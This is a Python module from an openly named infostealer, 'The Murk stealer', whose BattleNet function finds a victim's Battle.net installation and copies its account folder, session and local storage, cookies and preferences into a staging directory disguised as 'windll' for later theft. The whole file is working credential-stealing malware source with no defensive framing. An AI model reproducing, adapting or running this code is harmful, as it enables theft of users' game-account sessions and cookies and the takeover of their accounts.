#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import sep,environ,makedirs,path
from shutil import copytree, copy2
from manager.logger import Log

def BattleNet():
    pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
    msgInfo = ""
    if path.exists(f"{pathtofolder}\Battle.net\Account"):
        folders= [
            r'\Battle.net\Account',
            r'\Battle.net\BrowserCaches\common\Local Storage',
            r'\Battle.net\BrowserCaches\common\Session Storage',
            r'\Battle.net\Logs'
        ]
        files= [
            r'\Battle.net\BrowserCaches\LocalPrefs.json',
            r'\Battle.net\BrowserCaches\common\Cookies'
        ]
        makedirs(rf"{pathtofolder}\windll\Games\Battle.net")
        for folder in folders:
            try:
                copytree(f"{pathtofolder}{folder}",f"{pathtofolder}\windll\Games{folder}")
            except Exception as e:
                Log(f"BattleNet(folders) ---> {e}")
        for file in files:
            try:
                copy2(f"{pathtofolder}{file}",f"{pathtofolder}\windll\Games{file}")
            except Exception as e:
                Log(f"BattleNet(files) ---> {e}")
        msgInfo+="\n∟🎮Battle.net"
        return msgInfo
    else:
        Log("BattleNet ---> Not exist")
        return msgInfo